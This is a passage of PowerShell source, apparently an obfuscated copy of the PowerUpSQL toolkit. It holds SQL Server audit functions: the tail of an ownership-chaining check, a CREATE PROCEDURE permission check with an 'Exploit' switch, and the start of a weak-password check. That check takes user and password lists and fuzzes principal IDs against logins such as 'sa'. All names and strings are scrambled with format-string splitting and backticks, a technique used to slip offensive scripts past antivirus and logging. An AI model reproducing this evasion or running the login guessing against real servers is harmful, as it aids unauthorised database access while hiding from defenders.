            ${CHAiN`dA`TAb`A`SEs} = &("{1}{0}{3}{2}"-f 'QL','Get-S','se','Databa') -Instance ${i`NsT`AnCE} -Username ${U`se`R`Name} -Password ${p`ASSWO`Rd} -Credential ${credE`Nt`IAL} -SuppressVerbose | &("{2}{3}{0}{1}" -f 'j','ect','Wh','ere-Ob') -FilterScript {
                ${_}."IS`_DB_cHaInI`Ng`_`on" -eq ("{0}{1}"-f'Tr','ue')
            }
        }

        
        if(${cHa`iNDatAba`s`ES})
        {
            ${i`SvUln`Era`Ble}  = 'Yes'
            ${cHaINd`AT`Ab`AS`eS} |
            &("{1}{0}{3}{2}" -f'r','Fo','-Object','Each') -Process {
                ${d`AtaBasE`NAME} = ${_}."dat`AbAsen`A`mE"
				if(${DATa`Bas`enA`mE} -ne ("{0}{1}"-f'maste','r') -and ${dAtABaSEn`A`mE} -ne ("{1}{0}{2}" -f 'mpd','te','b') -and ${Data`B`AS`eNAmE} -ne ("{1}{0}" -f'b','msd'))
				{
					&("{0}{1}{3}{2}"-f'Wri','te-','rbose','Ve') -Message ("$Instance "+': '+'- '+'T'+'he '+'data'+'b'+'ase '+"$DatabaseName "+'has'+' '+'o'+'wner'+'shi'+'p '+'chain'+'ing'+' '+'ena'+'bl'+'ed.')
					${d`EtAi`ls} = ('T'+'he '+'databa'+'se'+' '+"$DatabaseName "+'wa'+'s '+'fo'+'und '+'confi'+'g'+'ur'+'ed '+'w'+'ith '+'ow'+'nershi'+'p'+' '+'ch'+'ain'+'ing '+'enab'+'l'+'ed.')
					${N`Ull} = ${T`B`LDAta}."RO`WS".("{0}{1}" -f 'Ad','d').Invoke(${cOMPUt`e`RNAMe}, ${InsTa`N`Ce}, ${v`ULN`Er`AbI`LItY}, ${dE`s`CrIPt`ION}, ${Re`mE`d`iaTIOn}, ${SE`VE`RiTY}, ${ISv`U`Ln`ErAbLE}, ${isEx`PlO`iTAbLe}, ${eX`pLo`iteD}, ${E`XPlo`iTc`mD}, ${DE`Tai`LS}, ${ref`Er`eN`cE}, ${A`UT`hOR})
				}
            }
        }
        else
        {
            &("{2}{0}{1}" -f 'e-Ve','rbose','Writ') -Message ("$Instance "+': '+'- '+'No'+' '+'non-def'+'au'+'lt'+' '+'databa'+'s'+'es'+' '+'were'+' '+'fou'+'nd'+' '+'wi'+'th '+'own'+'ersh'+'ip'+' '+'c'+'hain'+'ing '+'en'+'abled'+'.')
        }

        
        ${s`erVeRc`h`eCK} = &("{3}{5}{1}{0}{4}{2}" -f'i','rverConf','on','Get-SQL','gurati','Se') -Instance ${I`Nst`Ance} -Username ${UserNA`me} -Password ${p`AsswORD} -Credential ${C`REdenT`i`Al} -SuppressVerbose | &("{2}{1}{0}" -f'ject','b','Where-O') -FilterScript {
            ${_}."Na`ME" -like ("{1}{0}"-f 'ain*','*ch') -and ${_}."coNF`Ig_V`Al`Ue" -eq 1
        }
        if(${s`eRver`cHecK})
        {
            ${I`s`VUL`NER`ABLe}  = 'Yes'
            &("{0}{1}{2}{3}"-f'W','rite-V','e','rbose') -Message ("$Instance "+': '+'- '+'Th'+'e '+'s'+'er'+'ver '+'c'+'o'+'n'+'figura'+'tion '+('{0}'+'cross ')-f[chaR]39+'db'+' '+'o'+'wnersh'+'ip '+(('c'+'hai'+'ni'+'ngKAR'+' ')-RePlace  'KAR',[chaR]39)+'i'+'s '+'set'+' '+'to'+' '+'1.'+' '+' '+'This'+' '+'ca'+'n '+'affe'+'ct'+' '+'all'+' '+'databa'+'ses'+'.')
            ${dET`A`ILS} = ((("{12}{11}{5}{4}{18}{15}{14}{13}{6}{8}{7}{9}{17}{1}{19}{16}{2}{10}{3}{0}"-f'ses.','This ca','fect ','taba','serv',' ','cross db ow',' chaining{0} is ','nership','se','all da','he','T','on {0}','gurati','i','f','t to 1.  ','er conf','n a')) -f [ChAr]39)
            ${N`UlL} = ${t`BlDATa}."r`Ows".("{1}{0}"-f'd','Ad').Invoke(${C`o`mpuTeRnAme}, ${iN`s`TaNcE}, ${V`U`LNe`R`ABIlity}, ${d`eScRIp`TiON}, ${R`E`m`EdiaTiON}, ${sE`VER`iTY}, ${i`Sv`Uln`e`RaBLE}, ${is`eXpl`oITa`BLe}, ${Ex`plOit`eD}, ${EX`pl`oitc`Md}, ${d`etAiLS}, ${r`EF`ERencE}, ${AUt`HOr})
        }

        
        
        
        
        
        


        
        
        
        
        
        
        


        
        &("{2}{1}{0}"-f 'se','erbo','Write-V') -Message ("$Instance "+': '+'COMP'+'L'+'E'+'TED '+'V'+'U'+'LNERA'+'BILITY '+'CHE'+'CK: '+'Ex'+'ces'+'s'+'ive '+'P'+'rivi'+'lege '+'- '+'D'+'atab'+'as'+'e '+'Ow'+'ners'+'hip '+'C'+'h'+'aining')
    }

    End
    {
        
        if ( -not ${nOOUT`p`UT})
        {
            Return ${Tb`lda`TA}
        }
    }
}






Function INV`oke-S`QLauditPRI`V`Cr`eATepro`C`e`D`Ure
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MaNDatOrY = ${F`A`lse},
                ValueFroMPipeliNeBYpROpertyNamE = ${Tr`Ue},
        HELPMessAGE = {"{4}{9}{13}{2}{3}{1}{12}{7}{5}{0}{6}{8}{14}{11}{10}" -f' to aut','or ','er',' ','S','ccount','h','main a','en','Q','.','ith','do','L Serv','ticate w'})]
        [string]${U`s`e`Rname},

        [Parameter(MANDATorY = ${fA`lse},
                VALuefROmpipeLiNEBypRopertYnaME = ${T`Rue},
        HeLpMessaGe = {"{4}{6}{11}{9}{1}{3}{10}{0}{7}{2}{8}{12}{5}" -f' authe',' ','ca','account','SQL','.',' Server or d','nti','te w','ain',' password to','om','ith'})]
        [string]${P`AS`sWORd},

        [Parameter(MandATorY = ${fA`L`sE},
                VaLUEFROMPipeLInEByprOpErtyName = ${tr`UE},
        HELpmesSaGe = {"{4}{2}{1}{3}{0}" -f's.','i','credent','al','Windows '})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${credEnt`i`AL} =   ( gEt-iTeM ("vAriA"+"b"+"L"+"e:045"+"9m2")  ).vALuE::"emP`Ty",

        [Parameter(MaNdaToRy = ${fal`SE},
                vAlUefrOMPiPELiNEByPROPeRTYNAMe = ${TR`Ue},
        HELpMESSaGe = {"{2}{5}{0}{8}{7}{6}{4}{1}{9}{3}" -f'ver ins','ion ','SQL','.','t',' Ser',' connec','e to','tanc','to'})]
        [string]${i`N`StANCe},

        [Parameter(mAnDaTOrY = ${fal`se},
        HeLPmESSAge = {(("{6}{4}{1}{0}{5}{2}{3}" -f'}t outp','n{0','t anyth','ing.','o','u','D'))  -F[Char]39})]
        [string]${NoO`UtP`UT},

        [Parameter(mAndAToRy = ${F`A`LsE},
        HelpmeSsagE = {"{5}{0}{6}{1}{7}{2}{4}{3}" -f 'loit v','n','rab','e issues.','l','Exp','ul','e'})]
        [switch]${ExP`Lo`iT}
    )

    Begin
    {
        
        ${T`Bld`Ata} = &("{2}{1}{3}{0}" -f'ct','ew-','N','Obje') -TypeName ("{2}{3}{1}{4}{0}{5}"-f'a.Dat','Da','Sys','tem.','t','aTable')
        ${nu`LL} = ${tBl`DAtA}."c`OLU`MNs".("{0}{1}"-f 'Ad','d').Invoke(("{0}{1}{3}{2}"-f'C','omp','e','uterNam'))
        ${n`Ull} = ${T`B`lData}."cO`luM`Ns".("{0}{1}" -f 'A','dd').Invoke(("{0}{2}{1}" -f'I','stance','n'))
        ${N`Ull} = ${tBl`D`ATA}."COlUM`Ns".("{0}{1}"-f 'A','dd').Invoke(("{0}{2}{3}{1}"-f 'Vul','y','n','erabilit'))
        ${nU`LL} = ${Tb`lDATA}."c`oLumNS".("{1}{0}" -f 'd','Ad').Invoke(("{3}{0}{2}{1}" -f 's','n','criptio','De'))
        ${nU`lL} = ${T`Bld`AtA}."CO`Lu`Mns".("{1}{0}" -f 'd','Ad').Invoke(("{2}{0}{1}" -f'emediati','on','R'))
        ${N`UlL} = ${tblda`Ta}."c`OlUMnS".("{1}{0}"-f 'dd','A').Invoke(("{0}{1}{2}" -f 'S','eve','rity'))
        ${nU`Ll} = ${tB`Ld`ATa}."cOlU`Mns".("{0}{1}"-f 'A','dd').Invoke(("{0}{1}{2}"-f 'IsVuln','erabl','e'))
        ${n`ULL} = ${TBl`d`ATa}."C`oLUm`NS".("{1}{0}" -f 'dd','A').Invoke(("{0}{3}{2}{1}" -f'IsExp','ble','oita','l'))
        ${nU`LL} = ${T`BlDA`TA}."C`OLumns".("{0}{1}" -f'A','dd').Invoke(("{0}{2}{1}"-f 'Exp','ed','loit'))
        ${N`ULl} = ${t`BLDATA}."CO`lU`mNS".("{0}{1}"-f 'Ad','d').Invoke(("{1}{0}{2}{3}"-f'xpl','E','oitC','md'))
        ${nU`Ll} = ${T`B`lDATA}."COLU`M`NS".("{0}{1}" -f'A','dd').Invoke(("{0}{1}" -f 'De','tails'))
        ${N`UlL} = ${tb`lda`Ta}."C`OL`Umns".("{1}{0}" -f'dd','A').Invoke(("{1}{0}{2}" -f 'eren','Ref','ce'))
        ${NU`LL} = ${Tbl`D`Ata}."C`o`luMnS".("{1}{0}" -f'd','Ad').Invoke(("{0}{1}{2}"-f 'A','utho','r'))
    }

    Process
    {
        
        &("{2}{0}{3}{1}"-f 'te-V','bose','Wri','er') -Message ("$Instance "+': '+'ST'+'ART '+'VULNERABILI'+'T'+'Y '+'CH'+'ECK: '+'PERMISS'+'IO'+'N '+'- '+'CR'+'EATE'+' '+'PROCE'+'D'+'UR'+'E')

        
        ${teST`c`on`Nec`Tion} = &("{2}{1}{3}{0}" -f 'nTest','et-SQLConnect','G','io') -Instance ${i`N`sTANCe} -Username ${uSERN`A`Me} -Password ${Pa`S`sWOrD} -Credential ${c`RED`eN`TiAl} -SuppressVerbose | &("{1}{2}{3}{0}" -f't','Wh','ere','-Objec') -FilterScript {
            ${_}."s`Ta`Tus" -eq ("{2}{1}{0}" -f'e','essibl','Acc')
        }
        if(-not ${t`es`TcOnnEcti`ON})
        {
            
            &("{0}{4}{1}{2}{3}" -f 'Write-','er','bo','se','V') -Message ("$Instance "+': '+'C'+'ONNE'+'CTION '+'FAIL'+'E'+'D')
            &("{3}{4}{2}{1}{0}"-f'e','s','-Verbo','Wri','te') -Message ("$Instance "+': '+'CO'+'MPLETE'+'D '+'VU'+'LN'+'ERABILITY '+'C'+'HEC'+'K: '+'PER'+'MISS'+'ION '+'- '+'C'+'REATE '+'P'+'ROCE'+'DURE')
            Return
        }
        else
        {
            &("{2}{1}{3}{0}" -f 'rbose','ite-V','Wr','e') -Message ("$Instance "+': '+'CO'+'NNECT'+'ION '+'SUCCES'+'S')
        }

        
        ${SEr`VEri`NFO} = &("{1}{3}{2}{0}" -f'rInfo','G','QLServe','et-S') -Instance ${in`sTA`NCE} -Username ${Use`RNa`Me} -Password ${Pas`SWORd} -Credential ${c`Red`e`NtiaL} -SuppressVerbose
        ${C`oMPUte`RN`AMe} = ${seRv`ER`INfo}."Com`P`UTERN`AME"
        ${Cu`Rr`EN`Tl`ogIN} = ${s`erV`eRiNFO}."CurrEN`T`l`OgIN"
        ${CU`RrEnTLO`GINr`Ol`eS} = &("{1}{2}{3}{0}" -f 'leMember','G','et-SQL','ServerRo') -Instance ${Inst`ANce}  -Username ${us`e`RN`AmE} -Password ${P`As`sWord} -Credential ${CrEden`T`i`AL} -PrincipalName ${cU`Rr`ENTlOGin} -SuppressVerbose
        ${c`URReNTPrin`cPA`l`LIsT} = @()
        ${cUrRe`NtPrInCpAl`li`St} += ${CuRR`EN`TlO`GiN}
        ${cUrR`ENtp`RI`NC`PallISt} += ("{1}{2}{0}"-f'ic','Pu','bl')
        ${CUrren`TlO`Gi`NroL`Es} |
        &("{0}{1}{3}{2}" -f 'ForEac','h','ect','-Obj') -Process {
            ${cUr`R`eNT`pri`NCPallIST} += ${_}."ro`LEPriNCi`PAl`NAmE"
        }

        
        
        
        if(${EX`pl`oit})
        {
            ${TES`T`MOdE}  = ("{1}{0}" -f 'it','Explo')
        }
        else
        {
            ${TeStM`o`DE}  = ("{0}{1}" -f'Audi','t')
        }
        ${vUlNeR`ABiLI`Ty} = ("{3}{0}{4}{2}{1}{7}{5}{6}" -f 'RMISS','ATE P',' CRE','PE','ION -','OCE','DURE','R')
        ${de`SCript`i`On}   = ("{5}{18}{13}{11}{1}{3}{2}{8}{12}{15}{20}{17}{10}{14}{24}{0}{9}{6}{25}{4}{21}{22}{7}{23}{19}{16}"-f' allow the login to','privileg','re','es to c','ivile','The log','escal','n t','ate',' ','ase',' has ',' stored','n','s.  Thi',' procedures in one or ','atabase.','tab','i','e d','more da','ges ','withi','h','s may','ate pr')
        ${R`emeDIati`ON}   = ("{20}{2}{27}{7}{12}{3}{32}{23}{30}{39}{41}{19}{24}{21}{33}{28}{4}{29}{36}{10}{13}{18}{26}{9}{22}{5}{38}{17}{6}{25}{8}{1}{40}{14}{15}{31}{11}{37}{35}{34}{16}{0}"-f 'r','be ',' is not ','ov','like: GRA','TO user,','d ','quired',' ','D','TE','mand l',' rem',' P','ved ','with a ','O use','an','RO','nted','If the permission','with a ','URE ',' ',' ','can','CE','re','mmand ','NT ',' Pe','com','e it.','co','T',' ','CREA','ike: REVOKE CREATE PROCEDURE',' ','rmissions','remo',' are gra')
        ${Se`V`eriTY}      = ("{0}{1}"-f'Med','ium')
        ${I`SvUl`NErA`BLE}  = 'No'
        ${iS`e`XP`LOit`AbLE} = 'No'
        ${ExpL`o`I`TED}     = 'No'
        ${ex`plOiTC`mD}    = ('No'+' '+'explo'+'it '+'is'+' '+'cur'+'r'+'ently '+'a'+'vail'+'able '+'t'+'hat '+'w'+'ill '+'al'+'low '+"$CurrentLogin "+'t'+'o '+'be'+'come'+' '+'a '+'s'+'ysadmin.')
        ${DE`TaI`ls}       = ''
        ${d`eP`ENdanC`ieS} = ''
        ${REF`eR`ENCe}     = ("{5}{8}{10}{17}{2}{6}{4}{3}{11}{13}{14}{19}{1}{7}{15}{16}{0}{18}{12}{9}"-f 's187926.','s/li','i','t.c','f','https:','croso','b','//','96','msdn.','o','173','m/','en','rary','/m','m','aspx?f=255&MSPPError=-21472','-u')
        ${a`UTHor}        = ("{6}{0}{3}{2}{7}{4}{8}{1}{5}" -f'S',', NetSPI ','her','ut','ullbin','2016','Scott ','land (@_n','d)')

        
        
        
        

        
        ${PE`RMiS`SIo`Ns} = &("{2}{4}{1}{0}{3}" -f 'ab','t','Get-S','ase','QLDa') -Instance ${InS`TAn`cE} -Username ${USER`N`AMe} -Password ${pA`S`swORd} -Credential ${C`ReD`E`NtiAl} -HasAccess -SuppressVerbose | &("{2}{1}{4}{0}{3}"-f'SQL','et','G','DatabasePriv','-') -Instance ${I`N`sTAN`ce} -Username ${u`SErn`AMe} -Password ${P`As`SWORD} -Credential ${cre`DEnt`ial} -PermissionName ("{4}{1}{2}{0}{3}" -f'OCE','AT','E PR','DURE','CRE')

        if(${PE`R`mIS`sIoNs})
        {
            
            ${cUr`RenTPRINcpa`Ll`i`ST}|
            &("{2}{1}{4}{3}{0}" -f't','or','F','jec','Each-Ob') -Process {
                
                ${CUR`RENtpRinc`i`PAl} = ${_}
                ${P`ErM`issIonS} |
                &("{2}{1}{0}"-f 'rEach-Object','o','F') -Process {
                    ${a`Ff`ECt`EdPRi`NcI`paL} = ${_}."pR`inC`iP`ALname"
                    ${Af`Fe`CTE`dda`TaBaSE} = ${_}."dat`ABasENa`mE"

                    if(${a`F`FEct`EDprINcIpaL} -eq ${CUrReN`Tp`R`iNci`P`AL})
                    {
                        
                        ${iS`VULNER`ABLE}  = 'Yes'
                        &("{3}{2}{0}{1}"-f'er','bose','ite-V','Wr') -Message ("$Instance "+': '+'- '+'T'+'he '+"$AffectedPrincipal "+'princ'+'i'+'pal '+'h'+'as '+'the'+' '+'C'+'REATE '+'PRO'+'CE'+'DURE '+'p'+'er'+'mission '+'in'+' '+'th'+'e '+"$AffectedDatabase "+'d'+'atab'+'ase.')
                        ${dET`AiLS} = ('The'+' '+"$AffectedPrincipal "+'p'+'r'+'incipal '+'has'+' '+'t'+'he '+'C'+'R'+'EATE '+'PROCE'+'DUR'+'E '+'p'+'e'+'rmission '+'i'+'n '+'t'+'he '+"$AffectedDatabase "+'d'+'ataba'+'se.')

                        
                        
                        
                        
                        ${h`A`sALT`ersCHeMA} = &("{1}{2}{3}{0}"-f 'tabasePriv','Get-','SQLD','a') -Instance ${iNs`T`A`NCe} -Username ${uSer`N`Ame} -Password ${PA`sS`Word} -Credential ${cRe`denTi`Al} -PermissionName ("{1}{0}"-f 'TER','AL') -PermissionType ("{1}{0}" -f 'MA','SCHE') -PrincipalName ${C`UrrEnt`p`R`IncIpAL} -DatabaseName ${affE`CT`EddA`Ta`BaSE}  -SuppressVerbose
                        if(${H`As`ALtE`RSche`ma})
                        {
                            ${i`SE`XP`Loit`ABLE} = 'Yes'
                            ${DEpENd`A`N`CIES} = (' '+"$CurrentPrincipal "+'a'+'lso '+'has'+' '+'ALTE'+'R '+'SCHEM'+'A '+'permi'+'ssion'+'s '+'so'+' '+'proce'+'du'+'r'+'es '+'ca'+'n '+'be'+' '+'cre'+'ate'+'d.')
                            &("{1}{0}{2}"-f 'ite-Ve','Wr','rbose') -Message ("$Instance "+': '+'- '+'Depe'+'nd'+'ancie'+'s '+'were'+' '+'met'+': '+"$CurrentPrincipal "+'h'+'as '+'A'+'LTE'+'R '+'SCH'+'EMA '+'permi'+'ssi'+'ons.')

                            
                            ${nU`lL} = ${tbl`d`Ata}."ro`Ws".("{0}{1}"-f 'Ad','d').Invoke(${cOmPU`TERNA`me}, ${i`NS`TAnCe}, ${VULNE`RaB`IlITY}, ${DEsCRI`P`TiON}, ${R`EM`edia`TiON}, ${S`EvEr`itY}, ${ISv`UlNe`RAb`Le}, ${iSE`X`pLo`ITAbLe}, ${E`xpl`oiTed}, ${EX`plOIt`Cmd}, "$Details$Dependancies", ${rE`FEREN`Ce}, ${AUt`h`Or})
                        }
                        else
                        {
                            ${iSex`p`l`oitAb`le} = 'No'

                            
                            ${N`ULL} = ${Tb`LdA`TA}."r`OWs".("{1}{0}"-f'd','Ad').Invoke(${COMPu`TeR`N`AmE}, ${in`STaNCE}, ${V`ULneRAbI`li`Ty}, ${D`esCrI`P`Tion}, ${REMeDi`A`T`ION}, ${sE`VErI`TY}, ${isvuL`N`E`R`ABlE}, ${i`SEXp`lOIt`AB`lE}, ${ex`PL`oiTEd}, ${Ex`P`lOIT`cmd}, ${d`eTaI`lS}, ${ReF`ER`E`NCE}, ${AUt`HOR})
                        }

                        
                        
                        
                        

                        if(${E`XPloIT} -and ${IsEXP`loi`TabLE} -eq 'Yes')
                        {
                            &("{0}{2}{1}"-f 'Write-Ve','e','rbos') -Message ("$Instance "+': '+'- '+'No'+' '+'s'+'e'+'rver '+'es'+'cala'+'tion'+' '+'me'+'thod'+' '+'i'+'s '+'a'+'va'+'ilab'+'le '+'a'+'t '+'t'+'his '+'ti'+'me.')
                        }
                    }
                }
            }
        }
        else
        {
            
            &("{1}{2}{0}" -f 'rbose','W','rite-Ve') -Message ("$Instance "+': '+'- '+'The'+' '+'c'+'ur'+'rent '+'lo'+'gi'+'n '+('d'+'oesnmn'+'9t ')."RE`pla`cE"('mn9',[STrinG][CHaR]39)+'hav'+'e '+'t'+'he '+'CR'+'EATE '+'P'+'ROCEDU'+'RE '+'p'+'ermissio'+'n '+'i'+'n '+'an'+'y '+'data'+'bases'+'.')
        }

        
        &("{4}{1}{0}{3}{2}"-f'te-','ri','e','Verbos','W') -Message ("$Instance "+': '+'COMPLE'+'TE'+'D '+'VULNERAB'+'ILIT'+'Y '+'CHE'+'CK:'+' '+'PER'+'MISS'+'ION '+'- '+'CR'+'E'+'ATE '+'PROCED'+'UR'+'E')
    }

    End
    {
        
        if ( -not ${nOOu`Tp`Ut})
        {
            Return ${t`BldATA}
        }
    }
}






Function INvOke-`sqLAuD`ITweAkLo`Gi`N`pW
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MANDAtoRY = ${FAl`sE},
                VALUEfROMPiPElinEbYProPeRtynaME = ${tR`Ue},
        HELPmESSaGe = {"{8}{4}{6}{5}{1}{3}{2}{11}{10}{0}{7}{9}"-f 'z ','L Ser','er','v','n','wn SQ','o','login','K','s with.','ogin to fuz',' l'})]
        [string]${u`sernAme},

        [Parameter(MaNdatOry = ${fA`LsE},
                vaLUefrOmpipelineByprOPeRtYnaMe = ${tR`Ue},
        HeLpmeSsAge = {"{0}{3}{4}{2}{1}"-f 'U','.','est','serna','me to t'})]
        [string]${tE`ST`UsE`RN`Ame} = 'sa',

        [Parameter(mANDATOry = ${faL`se},
        heLPmEsSage = {"{7}{2}{9}{1}{3}{4}{8}{5}{0}{6}"-f'er lin','f',' to list',' u','se','se.  One p','e.','Path','rs to u',' o'})]
        [string]${usEr`FiLe},

        [Parameter(MaNDaTORy = ${F`AlSE},
                vALUeFrOMpIpElINEBypRoPeRTynAme = ${TR`Ue},
        HElPmESsAge = {"{10}{4}{7}{5}{1}{2}{0}{9}{8}{6}{3}" -f 'rd t','p','asswo',' with.','own SQL','erver ',' logins',' S',' fuzz','o','Kn'})]
        [string]${PAsS`w`orD},

        [Parameter(maNDatORY = ${Fa`lse},
                valuEfRoMPIPELineByPropeRtyName = ${TR`Ue},
        hELpmessagE = {"{7}{12}{9}{8}{1}{6}{2}{10}{11}{5}{3}{0}{4}" -f ' login wit','sw','d','pt to','h.','tem','or','SQL','s','pa',' to ','at',' Server '})]
        [string]${tesTp`A`Ss`WOrd},

        [Parameter(MAnDATorY = ${FAL`Se},
        helPMESSAge = {"{3}{4}{2}{1}{9}{7}{6}{5}{8}{0}" -f'.','of pas',' list ','Path t','o','ne','e.  O','us',' per line','swords to '})]
        [string]${p`ASS`FIle},

        [Parameter(MAndATory = ${F`Al`se},
        HElpMESSAgE = {"{7}{1}{14}{12}{6}{5}{9}{3}{13}{11}{2}{4}{8}{10}{0}"-f 't.','ser is ','is settin',' by def','g di',' p','as','U','s','ass','ables i',' Th','ed ','ault.','test'})]
        [switch]${nO`USE`RAs`PaSs},

        [Parameter(mAnDatoRY = ${Fal`sE},
                valuEfrOMpIPeLinEbYPROpERTYnaME = ${T`RUe},
        heLpMeSsAge = {"{1}{0}{3}{2}" -f'dows cr','Win','ials.','edent'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${CREDeN`T`IaL} =  ( variaBLE  ("0"+"459m2")  -valUEONLY  )::"Em`pTY",

        [Parameter(MaNDaToRY = ${f`ALse},
                VaLUefromPIPeliNEbYPrOpErTyNaMe = ${tr`Ue},
        helpmESSAGE = {"{0}{6}{4}{5}{2}{1}{3}" -f'SQL Serve','tion t','nec','o.','tan','ce to con','r ins'})]
        [string]${I`NSt`ANCe},

        [Parameter(ManDAtorY = ${Fa`LsE},
        hElpMEsSAgE = {(("{1}{12}{5}{10}{16}{9}{4}{14}{8}{13}{11}{2}{15}{3}{7}{6}{0}" -f'r.','Don','ins from t',' ','um',' attempt','erve','s','a','en',' t',' log','Aigt','te','er','he','o '))."REp`LacE"(([ChaR]65+[ChaR]105+[ChaR]103),[stRInG][ChaR]39)})]
        [switch]${no`UsER`EnUm},

        [Parameter(mANdAtorY = ${fAL`Se},
        hELPmeSSAGe = {"{4}{5}{0}{3}{1}{2}" -f 'e','cipal IDs to fuzz','.','r of Prin','N','umb'})]
        [string]${F`Uzz`NUm} = 10000,

        [Parameter(MAnDaToRy = ${f`Al`Se},
        helpMESsAGe = {(("{2}{0}{1}{3}" -f 'nyth','ing','DonCkOt output a','.'))."re`pl`AcE"(([CHar]67+[CHar]107+[CHar]79),[stRiNG][CHar]39)})]
        [switch]${NO`out`PuT},

        [Parameter(MAnDaTORy = ${F`Al`Se},
        hElPMeSsage = {"{1}{2}{5}{6}{0}{3}{4}{7}" -f 'ra','E','xp','b','le is','loit ','vulne','sues.'})]
        [switch]${exPLo`IT}
    )

    Begin
    {
        
        ${tBl`da`TA} = &("{0}{2}{1}"-f 'New-','t','Objec') -TypeName ("{5}{2}{4}{1}{0}{3}" -f'ataTab','D','ystem.','le','Data.','S')
        ${N`ULl} = ${Tbld`Ata}."C`O`LumNS".("{1}{0}" -f'd','Ad').Invoke(("{3}{0}{2}{1}"-f'put','Name','er','Com'))
        ${NU`ll} = ${tB`ld`ATA}."coLu`MNS".("{0}{1}"-f'Ad','d').Invoke(("{2}{1}{0}" -f 'ance','t','Ins'))
        ${N`ULl} = ${tBL`data}."cO`L`UMns".("{1}{0}" -f 'd','Ad').Invoke(("{0}{1}{3}{2}" -f 'Vul','nera','ity','bil'))
        ${nU`Ll} = ${tB`l`data}."Col`U`MNs".("{0}{1}" -f 'Ad','d').Invoke(("{1}{0}{3}{2}"-f'escri','D','ion','pt'))
        ${n`ULL} = ${TBLda`TA}."CoLu`Mns".("{1}{0}" -f'd','Ad').Invoke(("{2}{1}{0}"-f'n','ediatio','Rem'))
        ${n`UlL} = ${tBL`D`ATA}."co`l`UmnS".("{1}{0}"-f'd','Ad').Invoke(("{0}{1}" -f 'Severi','ty'))
        ${nu`Ll} = ${TBL`d`Ata}."C`OlUMns".("{1}{0}"-f'd','Ad').Invoke(("{1}{0}{2}"-f'ul','IsV','nerable'))
        ${n`Ull} = ${TBL`d`AtA}."c`oluMnS".("{1}{0}"-f'dd','A').Invoke(("{2}{0}{1}"-f 'l','oitable','IsExp'))
        ${NU`lL} = ${t`BlData}."CO`lU`Mns".("{1}{0}"-f'd','Ad').Invoke(("{2}{0}{1}" -f 'xp','loited','E'))
        ${N`UlL} = ${t`BLDatA}."c`OLu`mNS".("{1}{0}"-f 'd','Ad').Invoke(("{0}{2}{1}" -f 'E','itCmd','xplo'))
        ${nu`Ll} = ${t`BL`daTA}."co`L`UmnS".("{1}{0}" -f 'd','Ad').Invoke(("{0}{1}{2}" -f'D','e','tails'))
        ${Nu`LL} = ${T`B`LdaTA}."Col`U`Mns".("{0}{1}"-f 'Ad','d').Invoke(("{0}{1}{2}"-f 'Re','f','erence'))
        ${n`ULl} = ${T`Bld`AtA}."CoLu`Mns".("{0}{1}" -f'A','dd').Invoke(("{0}{2}{1}" -f 'Au','r','tho'))
    }

    Process
    {
        
        &("{3}{0}{2}{1}"-f 'e','bose','-Ver','Writ') -Message ("$Instance "+': '+'S'+'TART '+'VU'+'L'+'NERABILIT'+'Y '+'CH'+'EC'+'K: '+'Weak'+' '+'Log'+'in '+'P'+'assword')

        
        ${testco`N`N`e`CTioN} = &("{6}{2}{5}{0}{3}{1}{4}"-f 'nne','ion','-SQ','ct','Test','LCo','Get') -Instance ${INST`AncE} -Username ${us`e`RNAME} -Password ${P`As`sWORD} -Credential ${c`ReDe`NtiAl} -SuppressVerbose | &("{1}{3}{0}{2}"-f'je','Where','ct','-Ob') -FilterScript {
            ${_}."sta`TUS" -eq ("{3}{2}{1}{0}" -f 'ble','si','cces','A')
        }
        if(-not ${tEstCon`NEC`TiON})
        {
            
            &("{0}{2}{1}"-f'Wr','e-Verbose','it') -Message ("$Instance "+': '+'C'+'ONNE'+'CTION '+'FAIL'+'E'+'D.')
            &("{1}{0}{2}"-f'rite-','W','Verbose') -Message ("$Instance "+': '+'COMPLET'+'E'+'D '+'VUL'+'N'+'ERABILIT'+'Y '+'CH'+'ECK:'+' '+'Weak'+' '+'Log'+'in '+'Passw'+'ord'+'.')
            Return
        }
        else
        {
            &("{1}{0}{2}{3}" -f 'e-Ve','Writ','r','bose') -Message ("$Instance "+': '+'CONNEC'+'T'+'ION '+'SUCCESS'+'.')
        }

        
        ${s`ervErI`Nfo} = &("{0}{3}{4}{2}{1}"-f'Get','erInfo','v','-SQL','Ser') -Instance ${i`NStaN`ce} -Username ${u`s`ERN`AmE} -Password ${p`A`sSwORD} -Credential ${c`R`eDEnTi`AL} -SuppressVerbose
        ${CU`R`RENTlOGin} = ${S`E`Rv`erInFo}."Cu`RREnt`lOGiN"
        ${CO`mP`UtErNAME} = ${SErve`RI`N`Fo}."c`OMp`Ut`eRNamE"
        ${cU`RrENTuSERSy`S`ADM`In} = ${SER`Ve`RInfO}."Is`sYsadm`iN"

        
        
        
        if(${ex`ploit})
        {
            ${tEs`Tmo`de}  = ("{1}{0}" -f'xploit','E')
        }
        else
        {
            ${Test`mode}  = ("{1}{0}"-f't','Audi')
        }
        ${v`UlN`ERAbi`LiTy} = ("{2}{3}{0}{1}"-f 'k Login Pas','sword','We','a')
        ${deS`cRI`Pti`ON}   = ("{39}{5}{17}{10}{30}{28}{6}{1}{19}{26}{27}{13}{3}{12}{4}{7}{33}{23}{35}{16}{41}{24}{31}{14}{29}{15}{22}{8}{32}{0}{37}{38}{25}{36}{40}{34}{11}{21}{9}{20}{18}{2}" -f't','r','.',' is ',' p','e','QL Serve','a',' to r',' a','or mo','ins h','configured with a weak','s','o','ized acce','ov',' ','cess to',' lo','c','ave','ss',' Thi','naut','affec','gi','n',' S','r','re','h','esources ','ssword. ',' log','s may pr','te','he',' ','On','d','ide u')
        ${re`MEDIati`ON}   = ("{12}{26}{9}{30}{22}{5}{13}{11}{17}{6}{25}{31}{32}{21}{14}{0}{18}{4}{20}{16}{10}{15}{3}{29}{27}{8}{7}{24}{28}{1}{2}{23}{19}"-f 'ire','a','s',' password. Co',' to',' ','log',' the O','heriting','ure a','tro','ver','E','Ser','qu','ng',' s',' ','d','olicy.',' use a','e',' SQL','sword p','S ','ins are','ns','er in','p','nsid','ll',' ','r')
        ${S`EVeRIty}      = ("{0}{1}"-f'H','igh')
        ${i`SVuLN`Er`A`BlE}  = 'No'
        ${i`s`EX`PLoiTABLe} = 'No'
        ${E`XpL`OITeD}     = 'No'
